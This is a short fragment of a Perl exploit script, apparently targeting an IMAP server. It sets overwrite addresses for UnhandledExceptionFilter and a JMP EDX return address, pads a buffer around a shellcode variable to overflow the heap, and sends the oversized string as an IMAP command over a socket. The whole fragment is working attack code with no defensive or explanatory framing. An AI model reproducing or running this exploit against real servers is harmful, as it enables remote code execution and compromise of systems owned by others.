$where = "\x4c\x14\xed\x77"; # UnhandledExceptionFilter 77ED144C
#$where = "\x20\xf0\xfd\x7f"; # PEB Lock Pointer 7FFDF000
$what = "\x3d\xb9\x82\x02"; # JMP EDX 03bfcb9A
 
$nops = "A" x 100;
$a = $nops . $shellcode . ("Z" x (0x2006-length($shellcode)-length($nops))) . $what . $where . ("Z" x (0x184AC - 0x200A - 12));
print $sock "a001 \"$a\r\n";
close($sock);